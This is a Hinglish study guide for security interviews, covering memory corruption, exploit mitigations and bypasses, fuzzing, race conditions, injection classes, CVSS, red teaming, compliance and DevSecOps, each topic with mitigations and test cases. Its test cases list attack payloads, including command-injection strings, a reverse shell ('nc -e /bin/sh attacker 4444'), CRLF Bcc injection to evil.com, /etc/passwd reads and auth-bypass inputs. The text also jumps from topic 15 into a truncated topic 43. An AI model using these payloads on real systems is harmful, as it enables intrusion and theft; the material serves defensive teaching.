01Buffer Overflow — Stack Smashing Basics

Definition
Program user input ko fixed-size buffer mein copy karta hai bina bounds check (strcpy, gets, sprintf) — input buffer se zyada lamba hota hai to adjacent stack memory overwrite hoti hai. Attacker return address (EIP/RIP) overwrite karke execution flow apne shellcode/jump target par le jaata hai. Pattern: A*offset + EIP_override + shellcode/NOP-sled. Detection: crash on long input (fuzzing), gdb se offset nikaalo (pattern_create/pattern_offset), EIP control confirm karo.
Impact
Remote/local RCE (classic: MS08-067, EternalBlue SMB), DoS (crash), privilege escalation — CVSS 9.8. Legacy C/C++ services, network daemons, parsers sabse vulnerable.
Mitigation (5 points)
  • Use memory-safe languages (Rust, Go, Java) for new code.
  • Bounds-checked functions: strncpy/snprintf/memcpy_s, or C++ std::string/vector.
  • Compiler hardening: -fstack-protector-all (canaries), -fPIE, -D_FORTIFY_SOURCE=2.
  • OS mitigations: ASLR, NX/DEP, W^X (topics 06-07).
  • SAST + fuzzing in CI (topic 08) — overflow classes early detect karo.
Test Cases (Hinglish)
  • Fuzz: 100/500/1000 char input bhejo — crash/segfault aata hai?
  • gdb: gdb ./vuln → run with pattern → info registers eip — overwritten?
  • Offset: pattern_create -l 500 then pattern_offset — exact offset milega.
  • EIP control: A*offset + "BBBB" — gdb mein EIP=0x42424242?
  • checksec: checksec ./vuln — canary/NX/PIE enabled hain?
  • Metasploit: pattern_offset + msfvenom shellcode (topic 06 Part 2).
Real-world Scenario
EternalBlue (MS17-010): SMBv1 mein buffer overflow — WannaCry ransomware ne 150+ countries mein 2 lakh+ systems encrypt kiye. Fix: patch + SMBv1 disable + memory-safe rewrite.

02Heap Overflow, Use-After-Free & Double Free

Definition
Heap overflow: heap-allocated buffer se zyada write — adjacent heap metadata/objects corrupt. Use-After-Free (UAF): freed memory ko phir use karna — attacker freed chunk ko apne data se replace karke function pointer/object vtable hijack karta hai. Double free: same chunk do baar free — allocator metadata corruption (glibc tcache dup, fastbin dup) → arbitrary write/alloc → RCE. Browser/PDF parsers, Chrome V8, glibc applications mein common.
Impact
RCE (browser exploits chain UAF+type confusion), info leak, DoS. Chrome/Firefox 0-days ka core bug class.
Mitigation (5 points)
  • Safe languages/RAII (Rust ownership, C++ smart pointers) — UAF compile-time khatam.
  • Never free then use — null pointers after free; double-free guards.
  • Allocator hardening: ASLR, guard pages, tcache key checks (glibc 2.32+).
  • Sandboxing: browsers isolate renderer processes (exploit impact limit).
  • Fuzzing + ASAN (AddressSanitizer) — UAF/heap bugs CI mein pakdo.
Test Cases (Hinglish)
  • ASAN build: gcc -fsanitize=address — UAF/double-free turant report hota hai.
  • UAF repro: object free karke phir use karo — crash/ASAN error?
  • Double free: same pointer do baar free karo — glibc abort/ASAN detect?
  • Heap overflow: malloc(8) par 16 bytes write karo — ASAN "heap-buffer-overflow".
  • Exploit path: freed object ka function pointer overwrite — EIP control (advanced lab).
  • Browser: --enable-sandbox off/on behavior — sandbox escape test (lab).
Real-world Scenario
Chrome V8 UAF + type confusion chain — in-the-wild 0-day (CVE-2023-2033 class) — attacker ne sandbox escape karke full system RCE kiya. Fix: patch + sandbox + site isolation.

03Format String Vulnerabilities

Definition
printf(user_input) — user input directly format string ban jaata hai. Attackers %x/%p se stack data leak (addresses, canaries, pointers), %s se arbitrary memory read, %n se arbitrary write (write byte count to address on stack) → EIP overwrite → RCE. Detection: input mein %x daalo — hexadecimal values leak hote hain?
Impact
Information disclosure (stack/canary leak → ASLR bypass), arbitrary write → RCE, DoS (%s on bad pointer). Classic: wu-ftpd, ProFTPD, Linux kernel (vsyscall).
Mitigation (5 points)
  • Never pass user input as format string: printf("%s", input) — never printf(input).
  • Compiler: -Wformat-security + -Wformat=2 — warnings fail karo.
  • Static analysis (Semgrep/CodeQL: "format string" patterns).
  • Modern mitigations: ASLR + PIE + RELRO (GOT read-only) se %n exploitation hard.
  • Code review: saare printf/sprintf/syslog calls check karo.
Test Cases (Hinglish)
  • Input mein %x%x%x%x daalo — hex values return aate hain? (leak).
  • %p %p %p %p — pointer leak; %s — memory read attempt (careful DoS).
  • %n test: write attempt — crash hota hai? (confirm vuln).
  • gdb: format string ke through EIP overwrite chain demo (advanced lab).
  • Audit: grep -rn "printf(" code/ — user input direct? Semgrep rule chalao.
Real-world Scenario
ProFTPD 1.3.3c mein format string — remote attacker ne %n se EIP overwrite karke shell liya (CVE-2010-4221). Fix: format string fix + ASLR/PIE deployment.

04Integer Overflow & Type Confusion

Definition
Integer overflow: arithmetic result type ki limit cross karta hai — size_t overflow: malloc(size + 1) jahan size=0xFFFFFFFF → 0 → chhota buffer, baad mein bada write (heap overflow chain). Signed/unsigned confusion: negative length as huge unsigned → bounds bypass. Type confusion: object ko galat type treat karna (casting) — attacker object layout control karke vtable/function pointer abuse (browser engine favourite).
Impact
Heap overflow chains → RCE (browsers, PDF parsers), auth bypass (length checks bypass), DoS. CVE-2019-2215 (Android), iPhone jailbreaks mein common.
Mitigation (5 points)
  • Safe integer arithmetic (checked_add, __builtin_add_overflow, Rust checked ops).
  • Never trust user-controlled sizes; validate range BEFORE allocation/copy.
  • Use unsigned types carefully; avoid mixed sign comparisons (-Wsign-compare).
  • Type safety: avoid unsafe casts; use typed containers; runtime type checks (RTTI/instanceof).
  • Sanitizers: UBSan/ASAN in CI (undefined behavior early detect).
Test Cases (Hinglish)
  • Length params: len=0xFFFFFFFF, len=-1, len=2147483648 bhejo — allocation behaviour?
  • Arithmetic bypass: size+header overflow — bada write chhote buffer mein?
  • UBSan: -fsanitize=undefined — overflow warnings milti hain?
  • Type confusion: JSON/API mein object type change karke (array↔object) — app crash/behavior?
  • Chunk size: zlib/PDF parsers par crafted sizes — ASAN detect?
Real-world Scenario
CVE-2019-2215 (Android binder): UAF + type confusion — rooted exploit chain se kernel RCE; fixed in patch. Lesson: parsers/types hamesha fuzz + sanitize.

05Why malloc Is Dangerous — & Safer Alternatives

Definition
malloc/free (manual memory management) dangerous kyun: 1. buffer overflow (size mismatch), 2. use-after-free (free ke baad use), 3. double free, 4. memory leaks (free bhoolna → DoS via exhaustion), 5. no bounds safety (pointer arithmetic galat). Safer alternatives: RAII + smart pointers (C++ unique_ptr/shared_ptr), GC languages (Java, Go, Python — automatic), Rust ownership model (compile-time memory safety), arena/region allocators, safe string/container APIs (std::string, vector), valgrind/ASAN for detection.
Impact
Manual memory bugs = RCE, leaks = DoS. OWASP/Google data: ~70% of security bugs memory-related (Microsoft/Chrome). Safer languages eliminate entire bug classes.
Mitigation (5 points)
  • New projects: memory-safe languages (Rust, Go, Java/Kotlin, Swift).
  • C++: smart pointers + RAII, avoid raw new/delete/malloc.
  • Legacy C: bounds-checked functions + compiler hardening (topic 01).
  • Tooling: ASAN/Valgrind/AddressSanitizer in test pipelines.
  • Limit attack surface: parsers sandbox mein (chrome sandbox model).
Test Cases (Hinglish)
  • Leak detection: valgrind --leak-check=full ./app — leaks report.
  • ASAN: UAF/double-free/heap-overflow build mein turant error (topics 01-02).
  • Code audit: grep -rn "malloc(" — kahan use ho raha hai? bounds safe?
  • DoS test: app ko repeated allocations par chalao — memory exhaustion hota hai? (authorized).
  • Rust/Go rewrite comparison: same feature — memory bug classes eliminated?
Real-world Scenario
Chrome/Windows team ne C++ → Rust migration start kiya kyunki memory bugs security bug list mein #1 the — Rust code mein UAF class compile-time hi khatam. Interview answer: "malloc se UAF/double-free/leaks aate hain — safer: RAII, GC, Rust ownership."

06Shellcode & Exploit Mitigations (ASLR, NX, Canary, PIE, RELRO)

Definition
Modern mitigations jo buffer overflow exploitation rokती hain: ASLR — stack/heap/libs random addresses (hardcoded addresses fail); NX/DEP — stack non-executable (shellcode seedha nahi chal sakta); Stack canary — return address ke aage random value; overwrite detect → abort; PIE — binary itself random base; RELRO — GOT (function pointers table) read-only (full RELRO) → GOT overwrite blocked; CFI/CET — indirect call targets validate. Attackers inhe bypass karte hain (ROP, ret2libc, leaks, partial overwrite — topic 07).
Impact
Mitigations ke bina = trivial RCE; ke saath = exploitation kaafi hard (info leak pehle chahiye). Isliye modern exploits hamesha leak + ROP chain use karte hain.
Mitigation (5 points)
  • Enable ALL: ASLR (kernel), NX, canaries, PIE, full RELRO (distro default hardened).
  • CFI/CET (Intel CET, Clang CFI) for indirect call protection.
  • W^X: memory kabhi executable+writeable nahi.
  • Sandboxing + seccomp — exploit ke baad impact limit.
  • Patch + fuzz — bugs nahi hone dena best mitigation.
Test Cases (Hinglish)
  • checksec --file=./vuln — canary, NX, PIE, RELRO status dekho.
  • ASLR test: cat /proc/sys/kernel/randomize_va_space — 2 = full ASLR.
  • Retry exploit 10 baar — ASLR ki wajah se address change hota hai? (crash inconsistency).
  • Canary test: overflow mein 1 byte badlo — "stack smashing detected" error?
  • NX test: shellcode stack par — execution denied (SIGSEGV)?
  • RELRO: readelf -l ./vuln — GNU_RELRO + BIND_NOW present?
Real-world Scenario
Vulnerable service par canary+NX+ASLR sab on — basic shellcode exploit fail; attacker ne format string se canary+libc leak karke ROP chain banaya (next topic) — mitigations exploit ko hard banati hain, impossible nahi.

07Bypassing Mitigations — ROP, ret2libc, JOP

Definition
NX ke baad bhi exploitation: ret2libc — stack par system("/bin/sh") ka address daalo (libc executable hai); ROP (Return-Oriented Programming) — existing code ke "gadgets" (ret se end hone wale instruction sequences) chain karke arbitrary logic — pop rdi; ret + "/bin/sh" + system; JOP — indirect jumps se same; ret2plt/ret2dl — ASLR ke bina libc address; partial overwrite — ASLR se sirf high bytes random. Leak (format string/UAF) se ASLR bypass hota hai. Tools: pwntools, ROPgadget, ropper, one_gadget.
Impact
Mitigations bypass → RCE remains possible on hardened systems (given a bug + leak). Real-world exploits (browser, kernel) ROP chains use karte hain.
Mitigation (5 points)
  • CFI/CET — ROP gadgets ka use detect/block karta hai (indirect branch tracking).
  • Fine-grained ASLR (function-level, not just base) — leak ke baad bhi hard.
  • Remove gadgets: compile with -fno-stack-protector nahi — actually strip unneeded code, CET shadow stack.
  • Kernel: kASLR + heap randomization + CONFIG_STRICT_KERNEL_RWX.
  • Bug elimination (fuzz/SAST) + sandbox — best defence.
Test Cases (Hinglish)
  • Ret2libc: libc base leak (format string) → system = base + offset → payload chain.
  • ROPgadget: ROPgadget --binary ./vuln --only "pop|ret" — gadgets dhundho.
  • pwntools: from pwn import *; r = ROP(elf) — chain auto-build.
  • one_gadget: one_gadget /lib/x86_64-linux-gnu/libc.so.6 — constraints check.
  • checksec + exploit attempt: CET enabled system par ROP fail hota hai? (lab).
Real-world Scenario
CTF/lab: NX+ASLR wala binary — format string se libc leak → pop rdi; ret gadget + system("/bin/sh") — ROP chain se shell. Real world: browser 0-days isi pattern se sandbox escape tak jaate hain.

08Fuzzing — AFL++, libFuzzer, Web Fuzzing

Definition
Fuzzing = automated random/mutated inputs se crash/vuln find karna. Coverage-guided: AFL++ (compile with afl-clang-fast, seed corpus, mutations, coverage feedback), libFuzzer (in-process harness + sanitizers), honggfuzz; web/API fuzzing: ffuf/gobuster (paths/params), Burp Intruder, wfuzz; protocol: boofuzz (network protocols). Flow: target + seed corpus → run hours/days → crashes → triage (ASAN report) → minimize (afl-tmin) → root cause. OSS-Fuzz: Google ka free fuzzing infra — 1000+ projects, thousands of bugs.
Impact
Heartbleed (2014) fuzzing se mila; OSS-Fuzz se 30k+ bugs — fuzzing sabse effective bug-discovery method for parsers/memory-unsafe code.
Mitigation (5 points)
  • Fuzz parsers/input-handling code in CI (regression + new code).
  • Run with sanitizers (ASAN/UBSAN/MSAN) — crashes meaningful.
  • Maintain seed corpus + crash corpus; triage pipeline.
  • Use OSS-Fuzz for open-source deps (supply chain).
  • Web: parameter/endpoint fuzzing as part of pentest (Intruder, ffuf).
Test Cases (Hinglish)
  • AFL++: afl-fuzz -i seeds/ -o out/ -- ./target @@ — crashes milte hain?
  • libFuzzer: clang -fsanitize=fuzzer,address harness.c — auto fuzz.
  • ASAN triage: crash report mein overflow/UAF type clear hai?
  • Web: ffuf -w params.txt -u https://target/api/FUZZ — 500s/errors detect.
  • Boofuzz: custom protocol script — malformed packets se crash?
  • Minimize: afl-tmin -i crash -o min -- target — smallest repro.
Real-world Scenario
OSS-Fuzz ne libarchive/OpenSSL ke 100+ bugs pakde (Heartbleed class) — production breach se pehle. Interview answer: "Fuzzing parsers + sanitizers in CI — thousands of bugs milte hain jo manual testing se miss ho jaate."

09Race Conditions — Deep Dive (TOCTOU, Double-Spend, Parallel Requests)

Definition
Race condition = timing gap between check aur use. TOCTOU (Time-of-Check to Time-of-Use): file permission check → use (attacker beech mein change karta hai — symlink swap). Double-spend: balance/coupon check → debit — parallel requests gap mein dono pass ho jaate hain (gift card 50x redeem). Web race: OTP verify (parallel guesses), coupon apply, withdrawal, quantity update, signup bonus, like/follow counts. Detection: Burp Turbo Intruder / custom script — same request 20-100 parallel threads; compare responses/balances.
Impact
Financial loss (unlimited redeem/withdrawal), account takeover (OTP race), business logic abuse — High/Critical in fintech.
Mitigation (5 points)
  • Atomic DB operations: row locks (SELECT ... FOR UPDATE), transactions with proper isolation.
  • Idempotency keys — same operation ID ek baar hi process hoga.
  • Unique constraints (coupon_user unique) — DB level duplicate roko.
  • Optimistic locking (version column) — stale updates reject.
  • Server-side single-threaded processing per resource (queue/lock).
Test Cases (Hinglish)
  • Turbo Intruder: same redeem request 50 concurrent — balance 50x badha?
  • OTP race: verify request parallel 10 — multiple successes? (Part 1 topic 32).
  • Withdrawal race: 2 transactions parallel — balance negative hota hai?
  • TOCTOU: file upload/check-then-use flows — beech mein tamper window (authorized lab).
  • Coupon: parallel apply — do baar use hota hai? (DB constraint test).
  • Retry: request replay after success — idempotency missing? (topic 41 Part 1).
Real-world Scenario
Cryptocurrency exchange: withdraw request parallel threads — same balance se 2 withdrawals approve hue (double-spend). Fix: row lock + idempotency key + reconciliation.

10XML Injection & XPath Injection

Definition
XML injection: attacker XML structure mein apne elements/attributes inject karta hai — <user><role>admin</role></user> modify, config tamper, extra data. XPath injection: XML query language (XPath) mein user input concatenate — auth bypass: ' or '1'='1 in login, ' or true(), ' or 1=1] | //user[ style; data extraction bina SQL ke. XSLT injection: attacker-controlled stylesheet → <xsl:include>, document(), extension functions → file read/RCE (PHP/Saxon).
Impact
Auth bypass, XML data tampering, file read (XSLT), info disclosure — XML-based legacy systems (SOAP, configs, document workflows) mein common.
Mitigation (5 points)
  • Parameterized XPath (variables/fn:data) — never string-concat user input.
  • Validate/escape XPath special chars (' " [ ]) in queries.
  • XML: strict schema (XSD) validation before processing.
  • XSLT: disable extension functions/document access; allowlist stylesheets.
  • Prefer JSON over XML for new APIs.
Test Cases (Hinglish)
  • Login: ' or '1'='1, ' or 1=1-- in username — bypass?
  • XPath error: ' daalo — XPath error message aata hai? (info leak).
  • Boolean: ' and 1=1 vs ' and 1=2 — responses differ?
  • Extraction: ' or string-length(//user[1]/pass)>8 and '1'='1 — blind.
  • XML injection: POST body mein extra <role>admin</role> — accepted?
  • XSLT: stylesheet upload/test — <xsl:value-of select="document('/etc/passwd')"/>.
Real-world Scenario
SOAP-based banking API: XPath login query //user[name='"+input+"'] — ' or '1'='1 se bina password login. Fix: parameterized XPath + WSDL auth.

11Command Injection (OS Command Injection)

Definition
User input directly OS command mein jaata hai: system("ping " + ip), exec(), Runtime.exec(), os.system(), backticks in PHP. In-band: output response mein dikhta hai (; id, | id, && id, || id, `id`, $(id)). Blind: output nahi dikhta — time-based (; sleep 5, ping -c 5 127.0.0.1), OOB (curl to Collaborator), error-based. Windows: | whoami, & whoami; Linux: ; whoami, $(whoami).
Impact
Full RCE as service user — file read/write, reverse shell, lateral movement, ransomware — Critical.
Mitigation (5 points)
  • NEVER call OS commands with user input — use libraries/APIs instead.
  • If unavoidable: strict allowlist of commands + args; no shell metacharacters.
  • Parameterized exec with argument arrays (no shell interpretation).
  • Least-privilege service account + chroot/container.
  • Egress filtering (blind/OOB exfil roko) + WAF as defense-in-depth.
Test Cases (Hinglish)
  • Ping/URL/hostname fields: 127.0.0.1; id, | whoami, && uname -a.
  • Blind: ; sleep 5 — response delay? (time-based confirm).
  • OOB: ; curl http://collab.oastify.com — DNS/HTTP hit?
  • Windows: & whoami, | dir; encoded: %3Bid, $() variants.
  • Escape bypass: ;echo${IFS}whoami, ;c''at${IFS}/etc/passwd (filter bypass).
  • Error-based: ; cat /nonexistent — error message output leak?
Real-world Scenario
Network diagnostic tool (ping param) — 127.0.0.1; nc -e /bin/sh attacker 4444 se reverse shell → server compromise. Fix: remove shell usage, arg-array exec, allowlist.

12LDAP Injection

Definition
LDAP queries (directory services — AD, OpenLDAP) mein user input bina filter: &(uid=USER)(userPassword=PASS) — injection chars: * (wildcard), (, ), |, &, !. Auth bypass: uid=*)(uid=*))(|(uid=* ya * as password; info disclosure: boolean blind — admin)(|(cn=*, filter manipulation se attributes enumerate; DoS — complex filters. RFC 4515 escaping zaroori.
Impact
Authentication bypass on LDAP-based login (VPN, portals), directory enumeration (users, groups, emails), access control bypass — enterprise systems mein serious.
Mitigation (5 points)
  • Escape LDAP special chars per RFC 4515 (\2a \28 \29 \5c \00).
  • Parameterized LDAP APIs (bind variables) where available.
  • Validate input: allowlist charset for usernames.
  • Least privilege LDAP bind account (read-only, subtree-limited).
  • Log + monitor LDAP query anomalies (WAF/IPS rules).
Test Cases (Hinglish)
  • Login: username *, password * — login hota hai? (wildcard bypass).
  • admin)(|(password=*, admin)(& variants try karo.
  • Boolean: admin)(uid=* vs admin)(uid=x — response differ?
  • Enum: *)(uid=* in search field — saare users list?
  • Error: )(&(& — LDAP error message aata hai? (info leak).
Real-world Scenario
Corporate VPN login LDAP filter bina escape — * as password se attacker kisi bhi username par login kar gaya (first match). Fix: RFC 4515 escaping + MFA.

13NoSQL Injection (MongoDB, Elasticsearch)

Definition
NoSQL databases query operators accept karte hain: MongoDB JSON operators — $ne (not equal), $gt (greater), $where (JS execution), $regex, $exists. Auth bypass: {"username":{"$ne":null},"password":{"$ne":null}} — har user match; {"password":{"$regex":".*"}}. Data extraction (blind): $regex + boolean — character by character password guess. JS injection: $where: "this.password == 'x'" mein code exec (older MongoDB). Elasticsearch/Lucene: query string injection.
Impact
Auth bypass, full data extraction (blind regex), DoS (heavy queries), in legacy setups RCE via $where — modern NoSQL apps mein common.
Mitigation (5 points)
  • Validate input TYPES strictly: username/password must be strings — reject objects/arrays.
  • Never pass user JSON directly to query builder; use typed params.
  • Disable $where/JS execution server-side (mongod --noscripting).
  • Sanitize/whitelist operator usage; keep drivers patched.
  • Least-privilege DB users + network isolation.
Test Cases (Hinglish)
  • Login JSON: {"username":{"$ne":null},"password":{"$ne":null}} — bypass?
  • {"$gt":""} variants, {"$regex":".*"} — match hota hai?
  • Blind extract: {"$regex":"^a.*"} vs "^b.*" — response diff? (char guess).
  • Type confusion: string field par object bhejo — error/behavior?
  • Elasticsearch: ?q=user:admin AND password:* — query injection.
  • Legacy: $where: "sleep(5000)" — delay? (JS exec test, careful).
Real-world Scenario
Node.js app: login query User.find({user: req.body.user, pass: req.body.pass}) — attacker ne $ne operators bheje → bina password login. Fix: typed validation + ORM param binding.

14SMTP / Email Header Injection

Definition
Email fields (To/Subject/From/Name) user-controlled aur CRLF injection possible: %0d%0a (\r\n) se naye headers add — Bcc: victim@evil.com (spam), Reply-To: (phishing), fake From: (spoofing), body injection (message content change). Contact forms, notification systems, password-reset emails mein common. Python email module / PHP mail() header params vulnerable. Detection: email field mein %0d%0aBcc: attacker@evil.com.
Impact
Spam relay via your server (reputation damage, blacklist), phishing from trusted domain, recipient data leak (BCC), email spoofing.
Mitigation (5 points)
  • Validate email fields strictly (RFC regex) — reject CR/LF characters.
  • Use email libraries that escape header values (never raw header concat).
  • Strip/encode \r \n from ALL user inputs in mail flows.
  • Allowlist recipients — server-side fixed recipient for contact forms.
  • SPF/DKIM/DMARC — spoofed mails rejected at receivers.
Test Cases (Hinglish)
  • Name field: victim%0d%0aBcc: attacker@evil.com — BCC injected?
  • Subject: Hi%0d%0aReply-To: attacker@evil.com — header override?
  • Body injection: %0d%0a%0d%0aFAKE MESSAGE — body change hota hai?
  • Send test email to your inbox — headers inspect karo (Received/To).
  • SPF/DMARC: dig TXT target.com — spoof protection present?
Real-world Scenario
Newsletter signup form — name field CRLF se Bcc injection → attacker ne 10k newsletter recipients ki emails khud ko bhejwaye (data leak + spam). Fix: header escaping + fixed sender.

15HTTP Verb Tampering & Method Override

Definition
Server sirf kuch methods protect karta hai: GET/POST protected, lekin PUT/DELETE/PATCH/OPTIONS/HEAD unprotected ya alag behavior. Method override: X-HTTP-Method-Override: DELETE, X-Method-Override, _method=DELETE (Rails), X-Original-URL/X-Rewrite-URL (routing bypass) — WAF/framework routing confuse karke auth bypass. Test: har endpoint par saare methods try karo (OPTIONS se allowed methods dekho), override headers bhejo.
Impact
Auth bypass (admin functions via PUT), state changes via unexpected methods, WAF bypass (signatures sirf GET/POST dekhte hain), cache confusion.
Mitigation (5 points)
  • Explicit method allowlist per route (405 for others).
  • Disable/restrict method override headers at proxy level.

43CVSS v3.1 — Deep Dive

Definition

  • Document assumptions in every finding; review scores in triage.
  • Map to risk: CVSS (severity) × asset value × exposure = priority.

Test Cases (Hinglish)
  • Interview: incident walkthrough — "alarm aaya, kya karte ho?" (triage → scope → contain → eradicate → recover → lessons).
  • Playbook drill: ransomware scenario — isolation steps, comms, legal.
  • Evidence: Volatility (RAM dump) + log collection practice.
  • Timeline: alert se recovery tak timeline banao — gaps dhundho.
  • Tabletop: board members ke saath decision drills.
Real-world Scenario
Ransomware alert: EDR ne encryption activity detect kiya → 15 min mein host isolated → scope analysis (1 server, no lateral) → restore from backup → root cause (phished admin) → MFA forced. Fix: prep + monitoring + playbooks saved the org.

46Red Team vs Blue Team vs Purple Team

Definition
Red team — adversarial simulation: real TTPs (MITRE ATT&CK), multi-stage, stealthy, goal-based (exfil flag/domain admin), bina rules of engagement ke boundaries par; evades detection intentionally. Blue team — defenders: monitoring (SIEM/EDR), detection engineering, hunting, IR, hardening. Purple team — collaboration: red + blue ek saath — red team attacks, blue team detects/learns, gaps identified → detections built; continuous loop. Others: purple teaming exercises, adversary emulation frameworks (Atomic Red Team, Caldera). Metrics: time-to-detect, coverage vs ATT&CK, detection gaps. Difference from pentest: pentest = scope-specific vuln validation; red team = org-wide security posture test.
Impact
Red team: real-world readiness check (detection + response, not just vulns). Purple: team skill + detection coverage improvement.
Mitigation (5 points)
  • Define objectives (flags/crown jewels) + rules of engagement clearly.
  • MITRE ATT&CK mapping — coverage visibility.
  • Purple exercises after each red engagement (detections build).
  • Share intel: red team findings → blue team detection rules.
  • Track metrics: detection time, response time, gap closure rate.
Test Cases (Hinglish)
  • Red exercise: phishing → foothold → lateral → exfil — kya detect hua? kahan?
  • ATT&CK map: apne TTPs ka coverage matrix banao.
  • Atomic Red Team: detection test — atomic test chalao, alert aata hai?
  • Purple: ek technique detect karo → detection rule likho → retest.
  • Metrics: time-to-detect (TTD) measure karo per phase.
Real-world Scenario
Red team 30 din mein "domain admin" le gaya — blue team ne kuch nahi dekha (no logging) → purple phase: detections built → next exercise 3rd phase par pakda gaya. Fix: purple loop + logging gaps.

47Compliance — ISO 27001, NIST CSF, PCI DSS, GDPR

Definition
ISO 27001 — ISMS framework (Annex A controls, PDCA, certification audits); NIST CSF — 5 functions: Identify, Protect, Detect, Respond, Recover (flexible, US gov/industry); PCI DSS — card data: 12 requirements (network security, encryption, access control, monitoring, testing — v4.0: zero-trust leanings, SAQ vs full assessment); GDPR — EU data protection: DPIA, breach notification 72h, data minimization, rights (erasure/portability), fines up to 4% revenue; others: SOC 2 (trust services criteria), HIPAA (health), SOX (finance), CCPA. Pentester relevance: scoping (in-scope systems), evidence/report format, testing windows, data protection in findings.
Impact
Non-compliance = fines, contract loss, audit failures; compliance ≠ security but drives baseline controls + testing cadence.
Mitigation (5 points)
  • Map controls to framework (control matrix) — gap analysis.
  • Automate evidence collection (config scans, asset inventory).
  • Quarterly/annual pentests per PCI/GDPR requirements; scope correctly.
  • Continuous monitoring + risk register for exceptions.
  • Train teams on compliance requirements (data handling).
Test Cases (Hinglish)
  • Interview: "PCI mein kaunsa test mandatory?" — ASV scan + QSA pentest + segmentation test.
  • GDPR: data flow map — PII kahan hai? retention? erasure workflow?
  • ISO: internal audit simulation — control evidence gather karo.
  • NIST CSF: maturity assessment — har function score karo.
  • Breach sim: 72h notification drill — process ready?
Real-world Scenario
PCI scope mein CDE (card data environment) mis-scoped tha — segmentation test ne gap dikhaya → attacker CDE tak pahunch sakta tha. Fix: proper scoping + quarterly ASV + annual pentest.

48Vulnerability Management Lifecycle

Definition
Continuous VM process: 1. Discover/Inventory — assets (agents + agentless, cloud + on-prem); 2. Identify/Scan — authenticated scans, SCA, DAST, threat intel feeds; 3. Assess/Risk-rate — CVSS (topic 43) × asset criticality × exploitability (EPSS) → priority; 4. Remediate — patch, mitigate (compensating controls), accept (risk owner sign-off); 5. Verify — rescan, patch confirmation; 6. Report — KPIs: mean time to remediate (MTTR), patch coverage, SLA compliance, risk trend. Challenges: false positives, patch conflicts, legacy systems, prioritization overload ("patch everything" impossible). Tooling: Qualys/Tenable/Rapid7, OpenVAS (free), patch mgmt (WSUS/SCCM/Ansible), ticket integration (Jira/Snow).
Impact
Unpatched criticals = breach (Equifax 2017 = unpatched Struts). Good VM = measurable risk reduction + audit-ready.
Mitigation (5 points)
  • Risk-based prioritization (CVSS + EPSS + asset value) — not just score.
  • Automated scans (weekly/monthly) + authenticated where possible.
  • SLA tiers by severity (Critical: 7d patch, High: 30d, etc.).
  • False-positive triage process + re-validation.
  • Executive reporting: MTTR, risk score trend, exceptions register.
Test Cases (Hinglish)
  • Lab: OpenVAS/nessus scan — findings ko CVSS + EPSS se prioritize karo.
  • Patch cycle test: critical patch deploy → rescan → closed? (verify step).
  • KPI: MTTR calculate karo (reporting practice).
  • Exception process: accepted risk register banao — sign-off flow.
  • Discovery gap: unmanaged assets scan karo — inventory mein missing? (agent vs agentless).
Real-world Scenario
Equifax: Apache Struts CVE-2017-5638 scan mein tha but patch queue mein delay → breach (147M records). Fix: risk-based prioritization + SLA enforcement — not just "scan and report".

49DevSecOps — CI/CD Pipeline Security & Shift-Left

Definition
Security ko development lifecycle mein integrate karna (shift-left). Pipeline stages: 1. IDE/pre-commit — SAST (Semgrep/CodeQL/SonarQube), secret scanning (gitleaks), linting; 2. build — dependency SCA (npm audit/Dependency-Check/Snyk), container scanning (Trivy/Grype), SBOM generation; 3. test — DAST (ZAP/GitLab DAST), unit/integration security tests; 4. deploy — IaC scanning (Checkov/Tfsec), signing (cosign), policy gates, runtime (Falco), secrets (Vault); 5. post-deploy — continuous monitoring, pen-test schedule, bug bounty. Pipeline security itself: CI secrets (env vars, tokens), supply chain (topic 34), poisoned artifacts, pull-request code review, runner isolation, signed commits.
Impact
Vulns production mein pahunchne se pehle pakdo (10x cheaper); compromised pipeline = supply chain attack (SolarWinds).
Mitigation (5 points)
  • Gates per stage: SAST/SCA fail → build fail (no exceptions without review).
  • Secrets: Vault/KMS + never in env/repo; rotate automatically.
  • Scan everything: code, deps, containers, IaC, third-party actions (pinned).
  • Signed artifacts + verified provenance (SLSA).
  • Isolate runners, least-privilege CI tokens, audit pipeline config.
Test Cases (Hinglish)
  • Lab: git repo mein secret commit karo → gitleaks detect karta hai?
  • SAST: Semgrep rule se vuln pattern — CI gate fail hota hai?
  • SCA: vulnerable dep pin karo → audit fail? (fail-on-vuln config).
  • IaC: Checkov — S3 public wala Terraform → policy fail?
  • Trivy: vulnerable base image scan → build blocked?
  • CI secrets: pipeline env dump — tokens accessible? (authorized lab).
Real-world Scenario
Production se pehle SAST ne SQLi + SCA ne Log4Shell dep pakdi — release blocked, fix+retest → deploy. Interview: "Shift-left = vulns cheap fix, gates enforce, no security theater."

50Final Cheat Sheet & Scenario Q&A

Definition
Sabse zyada puchhe jaane wale interview scenarios — 1-line framework answers: 1. "SQLi detect kaise?" — ' error → boolean diff → time/OOB confirm. 2. "XSS stored XSS banaya, phir?" — session cookie HttpOnly hai to CSRF/UI redressing chain ya keylogger; HttpOnly nahi to cookie steal + login CSRF. 3. "IDOR mila?" — object-level check missing confirm karo (two accounts) → report with impact + fix (server-side ownership). 4. "JWT alg:none?" — signature verify na hone par bypass — fix: allowlist + verify. 5. "SSRF se aage?" — metadata (169.254.169.254), internal services, cloud creds — report + fix: allowlist egress. 6. "RCE mila?" — reverse shell → privilege escalation → lateral → impact demo → cleanup + report. 7. "Report kaise likhte ho?" — executive summary, scope, methodology, findings (risk-ranked, CVSS), evidence, remediation, retest. 8. "Bug bounty ke liye?" — scope read karo, low-hanging (IDOR/InfoLeak), quality reports, responsible disclosure.
Impact
Interview mein answer quality = structured (detect → confirm → exploit → impact → fix) + real-world examples + priorities clear.
Mitigation (5 points)
  • Always: detect → confirm (proof) → impact → remediation → retest cycle.
  • Severity + CVSS + business impact har finding mein.
  • Evidence: requests/responses, screenshots, PoC (clean).
  • Never overstate; test scope ke andar; data cleanup.
  • Follow-up: fix verification + regression tests.
Test Cases (Hinglish)
  • Mock interview: "Aapko blind RCE suspect hai, plan kya?" — time-based → OOB → exploit → impact.
  • Whiteboard: 3-tier app ka attack flow draw karo (web → API → DB).
  • Report drill: ek finding ka full report likho (5 sections).
  • Prioritization: 10 findings diye — kis order mein fix karaoge? (risk-based).
  • Scenario: "Client nahi maan raha vuln serious hai" — business impact se convince karo (breach cost, compliance).
Real-world Scenario
Full interview answer template: "Finding: IDOR on /api/users/:id. Evidence: User A token se User B ka PII. Impact: mass PII exposure (High, CVSS 7.5). Fix: server-side object-level authorization + UUIDs + audit log. Retest: two-account matrix in CI." — isi pattern se koi bhi scenario answer karo.
